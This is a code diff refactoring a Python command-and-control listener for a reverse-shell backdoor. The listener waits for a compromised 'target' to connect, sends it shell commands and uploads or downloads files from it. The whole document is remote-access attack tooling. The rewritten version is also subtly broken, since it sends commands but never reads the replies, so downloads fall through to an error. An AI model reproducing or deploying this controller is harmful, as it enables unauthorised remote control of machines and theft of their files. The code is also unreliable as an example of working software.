@@ -1,53 +1,55 @@
-import os
 import socket
-import json
+import base64
+import simplejson
 
-SERVER_IP = '0.0.0.0'
-SERVER_PORT = 5555
+class ControlServer:
+    def __init__(self, ip, port):
+        my_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        my_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        my_listener.bind((ip, port))
+        my_listener.listen(0)
+        print(f"Listening on {ip}:{port}")
+        (self.my_connection, my_address) = my_listener.accept()
+        print(f"Connection established from: {str(my_address)}")
 
-def reliable_send(data):
-    json_data = json.dumps(data)
-    target_sock.send(json_data.encode())
+    def json_send(self, data):
+        json_data = simplejson.dumps(data)
+        self.my_connection.send(json_data.encode("utf-8"))
 
-def reliable_recv():
-    data = ''
-    while True:
-        try:
-            data = data + target_sock.recv(1024).decode().rstrip()
-            return json.loads(data)
-        except ValueError:
-            continue
+    def json_receive(self):
+        json_data = ""
+        while True:
+            try:
+                json_data = json_data + self.my_connection.recv(1024).decode()
+                return simplejson.loads(json_data)
+            except ValueError:
+                continue
 
-def upload_file(filename):
-    file = open(filename, 'rb')
-    target_sock.send(file.read())
-    file.close()
+    def save_file(self, path, content):
+        with open(path, "wb") as my_file:
+            my_file.write(base64.b64decode(content))
+            return "Download OK"
 
-def download_file(filename):
-    file = open(filename, 'wb')
-    target_sock.settimeout(1)
-    chunk = target_sock.recv(1024)
-    while chunk:
-        file.write(chunk)
-        try:
-            chunk = target_sock.recv(1024)
-        except socket.timeout:
-            break
-    target_sock.settimeout(None)
-    file.close()
+    def get_file_content(self, path):
+        with open(path, "rb") as my_file:
+            return base64.b64encode(my_file.read())
 
-server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-server_sock.bind((SERVER_IP, SERVER_PORT))
+    def start_listener(self):
+        while True:
+            command_input = input("Enter command: ")
+            command_input = command_input.split(" ")
+            try:
+                if command_input[0] == "upload":
+                    my_file_content = self.get_file_content(command_input[1])
+                    command_input.append(my_file_content)
 
-print('[+] Listening For Incoming Connections')
-server_sock.listen(5)
-target_sock, target_ip = server_sock.accept()
-print(f'[+] Target Connected From: {str(target_ip)}')
+                command_output = self.json_send(command_input)
 
-while True:
-    command = input(f'* Shell~{str(target_ip)}: ')
-    reliable_send(command)
-    if command[:9] == 'download ':
-        download_file(command[9:])
-    elif command[:7] == 'upload ':
-        upload_file(command[7:])
+                if command_input[0] == "download" and "Error!" not in command_output:
+                    command_output = self.save_file(command_input[1], command_output)
+            except Exception:
+                command_output = "Error"
+            print(command_output)
+
+controlserver = ControlServer("0.0.0.0", 8080)
+controlserver.start_listener()
